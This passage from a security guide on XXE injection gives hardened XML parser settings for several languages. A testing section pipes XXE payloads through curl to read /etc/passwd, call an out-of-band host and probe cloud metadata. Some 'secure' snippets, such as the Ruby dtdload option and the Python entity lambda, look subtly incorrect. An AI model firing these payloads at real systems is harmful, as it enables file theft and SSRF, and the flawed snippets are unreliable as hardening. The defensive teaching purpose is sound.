factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

**Python:**
```python:secure
# Use defusedxml library
from defusedxml import ElementTree as ET

def parse_xml(data):
    return ET.fromstring(data)

# Or configure standard library securely
import xml.etree.ElementTree as ET

def parse_xml_secure(data):
    parser = ET.XMLParser()
    parser.entity_decl = lambda *args: None  # Disable entity declarations
    return ET.fromstring(data, parser=parser)
```

**PHP:**
```php:secure
<?php
// Disable external entity loading
libxml_disable_entity_loader(true);

// Use with caution - still allows internal entities
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET);
?>
```

**Node.js:**
```javascript:secure
const libxmljs = require('libxmljs');

// Disable network access
const xmlDoc = libxmljs.parseXml(xmlString, {
    noent: false,
    dtdload: false,
    dtdattr: false
});
```

#### Layer 2: Input Validation

```python:secure
import re
from lxml import etree

def validate_xml_structure(xml_data):
    """Validate XML doesn't contain dangerous patterns"""
    
    # Check for DOCTYPE declarations
    if b'<!DOCTYPE' in xml_data.upper():
        raise ValueError("XML contains DOCTYPE declaration")
    
    # Check for entity declarations
    if b'<!ENTITY' in xml_data.upper():
        raise ValueError("XML contains ENTITY declaration")
    
    # Check for external references
    if re.search(b'SYSTEM|PUBLIC', xml_data, re.IGNORECASE):
        raise ValueError("XML contains external reference")
    
    return True

def safe_xml_parse(xml_data):
    """Safely parse XML with validation"""
    validate_xml_structure(xml_data)
    
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        load_dtd=False
    )
    
    return etree.fromstring(xml_data, parser=parser)
```

#### Layer 3: Use Safer Data Formats

Consider alternatives to XML:
- **JSON**: Native to JavaScript, widely supported
- **YAML**: Human-readable (use safe loaders)
- **MessagePack**: Binary, efficient
- **Protobuf**: Schema-based, efficient

```python:secure
# Prefer JSON over XML
import json

def process_request(data):
    try:
        # JSON doesn't have external entity issues
        parsed = json.loads(data)
        return parsed
    except json.JSONDecodeError:
        raise ValueError("Invalid JSON")
```

### Language-Specific Secure Patterns

#### .NET / C#

```csharp:secure
// Secure XML processing in .NET
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcess = DtdProcess.Prohibit;  // Disable DTD processing
settings.XmlResolver = null;  // Disable entity resolution

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    XDocument doc = XDocument.Load(reader);
    // Process safely
}
```

#### Ruby

```ruby:secure
require 'nokogiri'

# Secure parsing
doc = Nokogiri::XML(xml_string) do |config|
  config.nonet             # No network access for external resources
  config.noblanks          # Remove blank nodes
  config.noerror           # Suppress parsing errors
  config.strict            # Strict parsing
  config.dtdload           # Don't load external DTDs
end
```

#### Go

```go:secure
package main

import (
    "encoding/xml"
    "io"
)

// Define struct for unmarshaling
type Document struct {
    XMLName xml.Name `xml:"root"`
    Data    string   `xml:"data"`
}

func parseXMLSafely(r io.Reader) (*Document, error) {
    // Go's encoding/xml doesn't expand external entities by default
    // but be explicit with Decoder settings
    decoder := xml.NewDecoder(r)
    decoder.Strict = true
    
    var doc Document
    if err := decoder.Decode(&doc); err != nil {
        return nil, err
    }
    return &doc, nil
}
```

### Testing Your Defenses

```bash
# XXE Payloads to test against your application

# Test 1: Basic file read
echo '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>' | curl -d @- http://your-app.com/api

# Test 2: OOB test
echo '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "https://burpcollaborator.net/">]><test>&xxe;</test>' | curl -d @- http://your-app.com/api

# Test 3: SSRF test
echo '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><test>&xxe;</test>' | curl -d @- http://your-app.com/api

# Test 4: Billion laughs
curl -d @billion_laughs.xml http://your-app.com/api
```

---

## Tools & Resources

### XXE Detection Tools

| Tool | Purpose | URL |
|------|---------|-----|
| XXEinjector | Automated XXE exploitation | https://github.com/enjoiz/XXEinjector |
| XEEPEncoder | XXE payload encoder | https://github.com/GoSecure/xxe-payload-generator |
| OXML XXE | Office document XXE | https://github.com/BuffaloWill/oxml_xxe |
| XXE-CTF | XXE challenges | Various CTF platforms |

### OAST Tools

- **Burp Collaborator**: Built into Burp Suite Professional
- **Interactsh**: https://github.com/projectdiscovery/interactsh
- **DNSBin**: https://dnsbin.zhack.ca/

### Learning Resources

- **OWASP XXE Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- **PortSwigger XXE Labs**: https://portswigger.net/web-security/xxe
- **XXE Payloads by PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### Practice Labs

- **WebGoat XXE Lessons**: Intentionally vulnerable application
- **XXE Lab by Audi-1**: Docker-based XXE practice
- **HackTheBox Machines**: Various XXE challenges
- **TryHackMe XXE Rooms**: Guided learning

---

## Conclusion

XXE injection is a powerful and often underestimated vulnerability that can lead to data exfiltration, SSRF, and DoS attacks. The variety of attack vectors—from direct file reading to OOB exfiltration, from file uploads to content-type bypasses—makes XXE a critical vulnerability to understand.

Key takeaways:

1. **For Bug Bounty Hunters**: XXE often pays well because it's dangerous and sometimes hidden in unexpected places like file uploads and image processors. Always test SVG uploads, Office document processing, and XML content type endpoints.

2. **For Developers**: Disable DTD processing and external entities by default. Use modern XML libraries with security features enabled. Consider alternatives to XML when possible.

3. **For Everyone**: XXE is preventable with proper configuration. Never trust XML input without proper sanitization and parser hardening.

---

*This guide is a living document. Security research is ongoing, and new XXE techniques emerge regularly. Stay updated, practice on labs, and contribute your findings to the security community.*

**Found this guide helpful?** Share it with your team and help raise awareness about XXE vulnerabilities. If you discover XXE vulnerabilities using these techniques, practice responsible disclosure.

---

*Published by KrazePlanet Security Research. For educational purposes only.*
